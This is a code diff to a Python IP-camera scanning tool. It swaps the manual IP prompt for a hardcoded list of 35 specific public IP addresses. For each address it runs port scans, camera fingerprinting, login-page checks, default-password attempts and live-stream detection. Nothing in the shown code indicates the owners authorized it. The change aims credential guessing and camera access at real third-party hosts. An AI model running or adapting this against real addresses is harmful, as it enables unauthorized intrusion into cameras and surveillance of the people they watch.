@@ -1057,38 +1057,46 @@ def detect_live_streams(ip, open_ports):
 
 def main():
     global threads_running
+    ipnums = [
+      "62.131.142.185","62.131.142.179","77.249.86.153","62.131.142.125","77.249.86.22","77.249.86.210","62.131.142.116","77.249.86.225","77.249.86.13","77.249.86.229","77.249.86.43","62.131.142.170","77.249.86.160","77.249.86.94","77.249.86.119","77.249.86.247","77.249.86.159","62.131.142.50","62.131.142.109","77.249.86.74","62.131.142.52","77.249.86.219","62.131.142.184","77.249.86.226","62.131.142.201","62.131.142.0","62.131.142.171","62.131.142.18","62.131.142.114","62.131.142.188","77.249.86.55","62.131.142.9","62.131.142.2","62.131.142.112","77.249.86.99"
+    ]
+
+
     try:
-        target_ip = input(f"{G}[+] {C}Enter IP address: {W}").strip()
-        if not validate_ip(target_ip):
-            return
-        
-        print(BANNER)
-        print('____________________________________________________________________________\n')
-        
-        print_search_urls(target_ip)
-        google_dork_search(target_ip)
-        get_ip_location_info(target_ip)
-        
-        open_ports = check_ports(target_ip)
-        if open_ports:
-            camera_found = check_if_camera(target_ip, open_ports)
-            if not camera_found:
-                choice = input("\n[❓] No camera found. Do you still want to check login pages, vulnerabilities, and passwords? [y/N]: ").strip().lower()
-                if choice != "y":
-                    print("\n[✅] Scan Completed! No camera found.")
-                    return
-            check_login_pages(target_ip, open_ports)
-            fingerprint_camera(target_ip, open_ports)
-            test_default_passwords(target_ip, open_ports)
-            detect_live_streams(target_ip, open_ports)
-        else:
-            print("\n[❌] No open ports found. Likely no camera here.")
-        print("\n[✅] Scan Completed!")
-        
+        for ipnum in ipnums:
+          target_ip = ipnum
+
+
+          if not validate_ip(target_ip):
+              return
+          
+          print(BANNER)
+          print('____________________________________________________________________________\n')
+          
+          print_search_urls(target_ip)
+          google_dork_search(target_ip)
+          get_ip_location_info(target_ip)
+          
+          open_ports = check_ports(target_ip)
+          if open_ports:
+              camera_found = check_if_camera(target_ip, open_ports)
+              if not camera_found:
+                  choice = input("\n[❓] No camera found. Do you still want to check login pages, vulnerabilities, and passwords? [y/N]: ").strip().lower()
+                  if choice != "y":
+                      print("\n[✅] Scan Completed! No camera found.")
+                      return
+              check_login_pages(target_ip, open_ports)
+              fingerprint_camera(target_ip, open_ports)
+              test_default_passwords(target_ip, open_ports)
+              detect_live_streams(target_ip, open_ports)
+          else:
+              print("\n[❌] No open ports found. Likely no camera here.")
+          print("\n[✅] Scan Completed!")
+          
     except KeyboardInterrupt:
-        print("\n[!] Scan aborted by user")
-        threads_running = False
-        sys.exit(1)
+      print("\n[!] Scan aborted by user")
+      threads_running = False
+      sys.exit(1)
 
 if __name__ == "__main__":
     main()
